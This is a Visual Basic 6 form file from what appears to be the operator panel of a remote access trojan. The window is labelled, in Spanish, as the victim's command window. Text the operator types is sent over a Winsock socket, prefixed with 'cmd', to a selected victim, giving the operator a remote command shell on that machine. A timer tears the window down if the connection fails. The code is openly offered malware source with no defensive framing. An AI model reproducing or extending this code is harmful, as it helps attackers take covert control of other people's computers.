VERSION 5.00
Begin VB.Form Form4 
   BackColor       =   &H00000000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Microsoft Windows - CMD (Ventana de comandos de la victima)"
   ClientHeight    =   3510
   ClientLeft      =   11145
   ClientTop       =   1500
   ClientWidth     =   8040
   LinkTopic       =   "Form4"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3510
   ScaleWidth      =   8040
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   1440
      Top             =   2520
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Consolas"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   3285
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   7815
   End
End
Attribute VB_Name = "Form4"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Index_n As Integer
Dim vIndex As Variant
Dim aniCursor1 As clsAniCursor

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    If KeyAscii = 13 Then
    
        Form1.Winsock1(vIndex(0)).SendData "cmd" & Text1.Text
        Text1 = ""
        Text1.SetFocus
    
    End If
Else
    Unload Form2
    Unload Form4
    Unload Me
    lista.List1.ListItems.Add , , "[Error al procesar comando - conexion perdida]"
End If

End Sub

Private Sub Timer1_Timer()

If Form1.LV.SelectedItem.Index > 0 Then
    Index_n = (Form1.LV.SelectedItem.Index)
    vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")
End If

If Form1.Winsock1(vIndex(0)).state = sckError Then
    Unload Form2
    Unload Form4
    Unload Me
End If

End Sub
